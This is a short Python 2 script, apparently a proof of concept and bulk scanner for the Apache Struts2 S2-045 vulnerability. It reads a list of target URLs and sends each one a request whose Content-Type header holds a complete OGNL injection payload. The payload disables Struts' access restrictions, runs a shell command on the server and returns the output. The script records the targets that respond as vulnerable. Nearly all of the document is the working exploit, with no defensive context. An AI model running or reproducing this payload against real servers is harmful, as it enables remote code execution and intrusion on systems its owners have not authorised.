#!/usr/bin/python

import requests
import sys

targe_file=sys.argv[1]
urls=[]
st2_045_urls=[]

for targe in file(targe_file):
    targe=targe.strip()
    urls.append(str(targe))


def poc(url):
        if url.startswith('http:') or url.startswith('https'):
            header={}
            header['User-Agent']='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
            Context_type='''%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''
            header['Content-Type']=Context_type
            re=requests.get(url=url,headers=header)

            if 'html' not in re.text and 'script' not in re.text and 'title' not in re.text and 'div' not in re.text:
                return url+' exist st2_045'

            else:
                return 0
        else:
            print 'Please add http or https and try again! '
            sys.exit(0)

if __name__ == '__main__':
    for url in urls:
        result=poc(url)
        if type(result) is str:
            st2_045_urls.append(result+'\n')

    f=open('st2_045_result.txt','a')
    f.writelines(st2_045_urls)
    f.close()


